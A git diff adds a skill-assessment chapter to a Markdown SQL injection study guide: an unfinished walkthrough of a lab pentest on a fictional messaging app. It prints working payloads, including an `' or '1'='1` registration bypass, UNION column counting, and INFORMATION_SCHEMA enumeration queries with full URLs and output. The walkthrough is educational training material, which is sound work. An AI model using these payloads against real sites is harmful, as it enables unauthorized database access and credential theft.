@@ -38,6 +38,8 @@
 ### 🛡️ Chapter 15: Mitigating SQL Injection
 - Input Sanitization / Input Validation / User Privileges / WAF / Parameterized Queries
 ### 📋 Chapter 16: Command Reference
+### 🧠 Chapter 17: Skill Assessment
+- Scenario / Intercepting HTTPS with Burp Suite / Steps / Summary
 
 ---
 
@@ -3767,6 +3769,454 @@ Quick reference of the statements covered so far — this table will grow as mor
 | `CREATE USER 'u'@'host' IDENTIFIED BY '...';` | 🛡️ Mitigation — create a restricted DB user |
 | `GRANT SELECT ON db.table TO 'u'@'host';` | 🛡️ Mitigation — grant least privilege |
 | `mysqli_prepare()` + `mysqli_stmt_bind_param()` | 🛡️ Mitigation — parameterized query (strongest fix) |
+
+</details>
+
+---
+
+<details>
+<summary><h1>🧠 Skill Assessment</h1></summary>
+
+**Scenario**
+
+We have been contracted by **chattr GmbH** to conduct a penetration test of their web application. In light of a recent breach of one of their main competitors, they are particularly concerned with **SQL injection** vulnerabilities and the damage the discovery and successful exploitation of this attack could do to their public image and bottom line.
+
+They provided a **target IP address** and no further information about their website. The assessment is therefore a **black-box** engagement focused specifically on testing for SQL injection vulnerabilities on the web application.
+
+**Objective**
+
+- Approach the target with no prior knowledge (black box).
+- Discover and confirm an SQL injection entry point.
+- Exploit it to enumerate the database and retrieve the target flag.
+
+<details>
+<summary><h2>🧪 Intercepting HTTPS Traffic with Burp Suite</h2></summary>
+
+The web application in this assessment uses **HTTPS**, which Burp Suite **cannot intercept by default** — the TLS handshake fails because the browser does not trust Burp's proxy certificate. There are two ways around this:
+
+1. **Install Burp Suite's Certificate Authority (CA)** in your own browser, so it trusts the certificates Burp generates on the fly.
+2. **Use the browser integrated into Burp Suite**, which already trusts Burp's CA out of the box.
+
+The integrated browser is the quickest option. Navigate to the **Proxy** tab and click **Open Browser** — traffic to HTTPS sites is intercepted immediately, with no certificate setup required.
+
+> **TIP:** Burp's integrated browser also ships with a couple of extensions pre-installed, such as **DOM Invader**, a useful tool for identifying DOM-based XSS.
+
+</details>
+
+<details>
+<summary><h2>🏆 Steps</h2></summary>
+
+<details>
+<summary><h3>🔍 Step 1 - Surface Mapping & Account Registration</h3></summary>
+
+We start with only the target IP, so the first task is to map the attack surface. Navigating to the provided address lands us on the application, and the login form is the obvious first candidate:
+
+- `https://<TARGET>/`
+- `https://<TARGET>/login.php`
+
+Testing the **login form** with the usual discovery payloads — single quote (`'`), double quote (`"`), and the other escape characters — produced **no promising behaviour**: no SQL errors, no change in the response. In a black-box test a dead end just means we widen the surface, so we move on to the **registration** page:
+
+- `https://<TARGET>/register.php`
+
+The form asks for **four fields**:
+
+| Field | |
+|---|---|
+| `username` | |
+| `password` | |
+| `repeat password` | |
+| `invitation code` | |
+
+Submitting the form blindly — without knowing the application's conventions — returns a validation error that **leaks the expected format** of the invitation code:
+
+<table width="100%">
+<tr><td> 🖥️ <b>chattr — register.php</b> </td></tr>
+<tr><td>
+
+⚠️ **Invalid invitation code.** Please ensure it follows this format: **4 letters – 4 letters – 4 numbers** (e.g., `abcd-efgh-1234`).
+
+</td></tr>
+</table>
+
+> **NOTE:** Verbose validation messages are a small information leak on their own — here the server hands us exactly the format needed to craft a valid request, letting us get past registration and reach the endpoints behind it.
+
+With the format in hand, we can build a request the server accepts. Capturing it in Burp Suite shows the form actually posts to an **API endpoint**, `/api/register.php` — a new piece of surface worth testing later:
+
+<table width="100%">
+<tr><td> 🕸️ <b>Burp Suite — POST /api/register.php</b> </td></tr>
+<tr><td>
+
+```http
+POST /api/register.php HTTP/1.1
+Host: <TARGET>
+Cookie: PHPSESSID=4pbo7v0iq5hih67s85cjkoa5lu
+Content-Type: application/x-www-form-urlencoded
+<SNIP>
+
+username=user&password=Pass0000***&repeatPassword=Pass0000***&invitationCode=aaaa-aaaa-0000
+```
+
+</td></tr>
+</table>
+
+A conforming invitation code (`aaaa-aaaa-0000`) satisfies the `4-letters – 4-letters – 4-numbers` rule, so the request is now well-formed and the server will actually process it — whether it **accepts** the code is what we test next.
+
+</details>
+
+<details>
+<summary><h3>💥 Step 2 - Confirming Injection in the Invitation Code</h3></summary>
+
+With a well-formed request, we first attempt a **legitimate registration**. Our invitation code (`aaaa-aaaa-0000`) now has the right format, but it is **invented** — and the server rejects it as an invalid invitation code. Correct format is not the same as a valid, existing code, and with no way to guess a real one, a normal sign-up is a dead end. That is exactly what pushes us to test the field for injection.
+
+So we probe the `invitationCode` field. Appending a single quote (`'`) to the end of the value breaks the query and the server returns a **500 Internal Server Error** — the page fails to load entirely:
+
+<table width="100%">
+<tr><td> 🖥️ <b>chattr — HTTP 500</b> </td></tr>
+<tr><td>
+
+⚠️ **This page isn't working** — `<TARGET>` is currently unable to handle this request. **HTTP ERROR 500**
+
+</td></tr>
+</table>
+
+That crash is the tell: our quote produced an **odd number of quotes** and broke the SQL syntax, which means the field is concatenated straight into a query. Instead of a lone quote, we send the simplest auth-bypass payload — `' or '1'='1` — so the statement stays syntactically valid **and** always evaluates to true:
+
+<table width="100%">
+<tr><td> 🕸️ <b>Burp Suite — POST /api/register.php (body)</b> </td></tr>
+<tr><td>
+
+```http
+username=user&password=Pass0000***&repeatPassword=Pass0000***&invitationCode=aaaa-aaaa-0000' or '1'='1
+```
+
+</td></tr>
+</table>
+
+Instead of an error, the server accepts the registration and redirects us to the login page with a success banner:
+
+<table width="100%">
+<tr><td> 🖥️ <b>chattr — login.php</b> </td></tr>
+<tr><td>
+
+🟢 `https://<TARGET>/login.php?s=account+created+successfully!`
+
+</td></tr>
+</table>
+
+The injected `or '1'='1` made the invitation-code check pass regardless of the code's real validity. We log in with the credentials we just registered and reach the authenticated main page:
+
+- `https://<TARGET>/index.php`
+
+<details>
+<summary><h4>🧠 Reflection — Why login resists SQLi but registration doesn't</h4></summary>
+
+It is worth pausing on **why the same class of bug is exploitable on `register.php` but not on `login.php`**. We are black-box (no source access), so the following are the most plausible query shapes rather than confirmed facts — but the reasoning is what matters.
+
+The **login** query almost certainly uses a **parameterized statement**, where user input is bound as data and never parsed as SQL. That is exactly what we observe: our escape characters caused no error and no change in behaviour, because they were treated as a literal username/password:
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL — login (resistant, parameterized)</b> </td></tr>
+<tr><td>
+
+```sql
+SELECT * FROM users WHERE username = ? AND password = ?;
+```
+
+</td></tr>
+</table>
+
+The **invitation-code check** in registration, by contrast, behaves like a query built by **string concatenation** — a lone `'` crashes it (syntax error → 500), and `' or '1'='1` forces it always-true:
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL — registration (vulnerable, concatenated)</b> </td></tr>
+<tr><td>
+
+```sql
+SELECT * FROM invitations WHERE code = 'aaaa-aaaa-0000' or '1'='1';
+```
+
+</td></tr>
+</table>
+
+The `or '1'='1'` branch is always true, so the check returns a row and the server treats the invitation code as valid — the same auth-bypass logic seen earlier, applied to a validation step instead of a login.
+
+> **NOTE:** The lesson is that SQL injection defenses are applied **per query, not per application**. The high-visibility login form was hardened with prepared statements, while the invitation-code validation — an easy afterthought — concatenates input directly. A single unparameterized query anywhere reopens the whole vulnerability class, no matter how well the "front door" is locked.
+
+</details>
+
+</details>
+
+<details>
+<summary><h3>🔎 Step 3 - Mapping the Messaging Feature & Finding the Injectable Search</h3></summary>
+
+Authenticated, the main page is a small messaging application: we pick a **user to message**, and get two inputs — one to **search text within the conversation**, and one to **send a message** to that user. The selected user is carried in the URL:
+
+- `https://<TARGET>/index.php?u=1`
+
+Trying different values shows `u=1` is the **first user, `admin`**, and the IDs increment **consecutively** (`u=2`, `u=3`, …). That is a useful data point to keep in mind — the application exposes users by sequential numeric ID.
+
+> **NOTE:** Sequential, guessable identifiers (`u=1`, `u=2`, …) are worth noting early. Even before any injection, they hint at how records are keyed and give us a reliable way to target a specific user — `admin` at `u=1`.
+
+**Sending a message** produces a `POST` to a dedicated API endpoint, carrying the message body and the destination user:
+
+<table width="100%">
+<tr><td> 🕸️ <b>Burp Suite — POST /api/send.php</b> </td></tr>
+<tr><td>
+
+```http
+POST /api/send.php HTTP/1.1
+Host: <TARGET>
+Cookie: PHPSESSID=d4t2g7je7k4f48ah9dfup8hj5c
+Content-Type: application/x-www-form-urlencoded
+<SNIP>
+
+message=hey&to=1
+```
+
+</td></tr>
+</table>
+
+**Searching text**, by contrast, is a `GET` request that reflects our search term in the `q` parameter (alongside the current user `u`):
+
+<table width="100%">
+<tr><td> 🕸️ <b>Burp Suite — GET /index.php (search)</b> </td></tr>
+<tr><td>
+
+```http
+GET /index.php?q=he&u=1 HTTP/1.1
+Host: <TARGET>
+Cookie: PHPSESSID=d4t2g7je7k4f48ah9dfup8hj5c
+<SNIP>
+```
+
+</td></tr>
+</table>
+
+Following the same principle as before — from the simplest test upward — we inject a single quote into the search parameter (`q=%27`, the URL-encoded `'`):
+
+<table width="100%">
+<tr><td> 🕸️ <b>Burp Suite — GET /index.php?q=%27&u=1</b> </td></tr>
+<tr><td>
+
+```http
+GET /index.php?q=%27&u=1 HTTP/1.1
+Host: <TARGET>
+Cookie: PHPSESSID=d4t2g7je7k4f48ah9dfup8hj5c
+<SNIP>
+```
+
+</td></tr>
+</table>
+
+- `https://<TARGET>/index.php?q=%27&u=1`
+
+We stay on the same page and **no error is shown**, but the entire message-writing section **disappears** from the response. That silent change in behaviour is the tell: our quote reached the query and broke it, altering what the page renders. The **search (`q`) parameter is our injection point** — and since results are reflected back into the page, this looks like an **in-band** injection worth escalating next.
+
+> **NOTE:** An injection point does not always announce itself with a SQL error. A **change in the page's behaviour** — content appearing, disappearing, or rendering differently — is just as valid a signal, and often the only one when errors are suppressed.
+
+</details>
+
+<details>
+<summary><h3>🧩 Step 4 - Escaping the Query Context & Counting Columns</h3></summary>
+
+We have an injectable parameter but **no SQL errors** to read, so we work blind — guided only by the behavioural oracle from the previous step:
+
+| Page behaviour | Meaning |
+|---|---|
+| Message section **disappears** (blank) | Our input broke the query |
+| Page **renders** normally | The query is syntactically valid |
+
+Every payload below is judged by that single question: **did the page come back?** Before we can extract data, two unknowns need solving — **how our input is wrapped** (the context we must escape), and **how many columns** the query returns (so a `UNION` will fit).
+
+<details>
+<summary><h4>Escaping the Context — Boundary Discovery</h4></summary>
+
+The `'` broke the page, so we are inside a **string** — but we do not know what surrounds that string. We are **not deducing** the structure from the source (we cannot see it); we **discover** it by trying a small, well-known set of closing sequences, each followed by `-- -` to comment out whatever original SQL trails behind, and watching the oracle:
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL — Boundary candidates (tested in `q`)</b> </td></tr>
+<tr><td>
+
+```sql
+'          -- -
+')         -- -
+'))        -- -
+%'         -- -
+```
+
+</td></tr>
+</table>
+
+| Payload in `q` | Page behaviour |
+|---|---|
+| `'` | Section disappears — **query broken** |
+| `') -- -` | Page **renders normally** — context escaped ✅ |
+
+The sequence that restores rendering is **`') -- -`**:
+
+- Payload: `') -- -`
+- URL: `https://<TARGET>/index.php?q=%27%29+--+-&u=1`
+
+That result is the discovery: our input sits inside a **parenthesised string**. To make the query valid again we had to close the quote (`'`) **and** a parenthesis (`)`), then comment out the original trailing characters with `-- -`. The `)` was found by trial against the oracle — never guessed from first principles.
+
+Inferred shape of the original query (inference from behaviour, not confirmed source):
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL — inferred original (search)</b> </td></tr>
+<tr><td>
+
+```sql
+SELECT ... FROM messages WHERE ( ... LIKE '<q>' ) ...;
+```
+
+</td></tr>
+</table>
+
+</details>
+
+<details>
+<summary><h4>Counting Columns — UNION</h4></summary>
+
+With the context escaped, we can append a `UNION`. A `UNION` requires an **equal number of columns** on both sides, so we start our injected `SELECT` and increment its column count until the page renders — any mismatch blanks the page out, exactly like a broken query. **Four** columns works:
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL — Payload</b> </td></tr>
+<tr><td>
+
+```sql
+word') union select 1,2,3,4-- -
+```
+
+</td></tr>
+</table>
+
+- URL: `https://<TARGET>/index.php?q=word%27%29+union+select+1%2C2%2C3%2C4--+-&u=1`
+
+The page renders and prints a **`3`** (in bold) with a **`4`** beneath it. Any other column count leaves the page blank — the same failure signature as the lone quote. This tells us two things:
+
+- The query returns **4 columns**.
+- Columns **3 and 4** are **reflected** on the page — these are our **output slots** for dumping real data in the next step (versions, table names, credentials, …).
+
+> **NOTE:** Constructing a payload like `word') union select 1,2,3,4-- -` is not a single leap of insight — it is the end of a **staged discovery**: confirm the injection (`'` breaks it) → escape the context by testing a short catalogue of boundaries against the oracle (`') -- -` renders) → find the column count with an incrementing `UNION SELECT`. This is exactly the boundary-and-column brute force that **sqlmap** automates, and the candidate lists live in [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings).
+
+</details>
+
+</details>
+
+<details>
+<summary><h3>🗃️ Step 5 - Database Enumeration</h3></summary>
+
+With columns **3 and 4** confirmed as reflected output slots, we walk the standard enumeration ladder — **version & database → tables → columns → data** — placing each piece of information we want into those visible positions (see [Database Enumeration](#-chapter-12-database-enumeration)).
+
+<details>
+<summary><h4>Database Name & Version</h4></summary>
+
+We put `database()` and `@@version` into the two visible columns to fingerprint the backend and learn the current schema name:
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL — Payload</b> </td></tr>
+<tr><td>
+
+```sql
+word') union select 1,2,database(),@@version from INFORMATION_SCHEMA.SCHEMATA-- -
+```
+
+</td></tr>
+</table>
+
+- URL: `https://<TARGET>/index.php?q=word%27%29+union+select+1%2C2%2C+database%28%29%2C%40%40version+from+INFORMATION_SCHEMA.SCHEMATA--+-&u=1`
+
+<table width="100%">
+<tr><td> 🖥️ <b>chattr — reflected output</b> </td></tr>
+<tr><td>
+
+```text
+chattr
+10.11.11-MariaDB-0+deb12u1
+```
+
+</td></tr>
+</table>
+
+The current database is **`chattr`** and the backend is **MariaDB 10.11.11** — a MySQL-family DBMS, which confirms the `INFORMATION_SCHEMA` approach we are about to use.
+
+> **NOTE:** `database()` and `@@version` are functions, not columns, so the `FROM INFORMATION_SCHEMA.SCHEMATA` is only there to give the `UNION` a valid table to read rows from — their values are constant on every row it returns.
+
+</details>
+
+<details>
+<summary><h4>Tables in the Database</h4></summary>
+
+Next we list the tables belonging to the `chattr` schema, placing `TABLE_NAME` in column 3:
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL — Payload</b> </td></tr>
+<tr><td>
+
+```sql
+word') union select 1,2,TABLE_NAME,4 from INFORMATION_SCHEMA.TABLES where table_schema='chattr'-- -
+```
+
+</td></tr>
+</table>
+
+- URL: `https://<TARGET>/index.php?q=word%27%29+union+select+1%2C2%2C+TABLE_NAME%2C4+from+INFORMATION_SCHEMA.TABLES+where+table_schema%3D%27chattr%27--+-&u=1`
+
+<table width="100%">
+<tr><td> 🖥️ <b>chattr — reflected output</b> </td></tr>
+<tr><td>
+
+```text
+Users
+InvitationCodes
+Messages
+```
+
+</td></tr>
+</table>
+
+Three valuable tables surface:
+
+- **`Users`** — almost certainly holds credentials.
+- **`InvitationCodes`** — the codes we bypassed back in registration.
+- **`Messages`** — the application's message data.
+
+We focus on **`Users`** for now, aiming to find an account with **higher privileges** than the one we just registered.
+
+</details>
+
+<details>
+<summary><h4>Columns of the Users Table</h4></summary>
+
+To know what to dump, we first enumerate the columns of `Users` via `INFORMATION_SCHEMA.COLUMNS`:
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL — Payload</b> </td></tr>
+<tr><td>
+
+```sql
+word') union select 1,2,COLUMN_NAME,4 from INFORMATION_SCHEMA.COLUMNS where table_name='Users'-- -
+```
+
+</td></tr>
+</table>
+
+- URL: `https://<TARGET>/index.php?q=word%27%29+union+select+1%2C2%2CCOLUMN_NAME%2C4+from+INFORMATION_SCHEMA.COLUMNS+where+table_name%3D%27Users%27--+-&u=1`
+
+_Output captured in the next step, where we use the column names to dump the credentials._
+
+</details>
+
+</details>
+
+</details>
+
+<details>
+<summary><h2>📝 Summary</h2></summary>
+
+_To be completed once the walkthrough is finished._
+
+</details>
 
 </details>
 
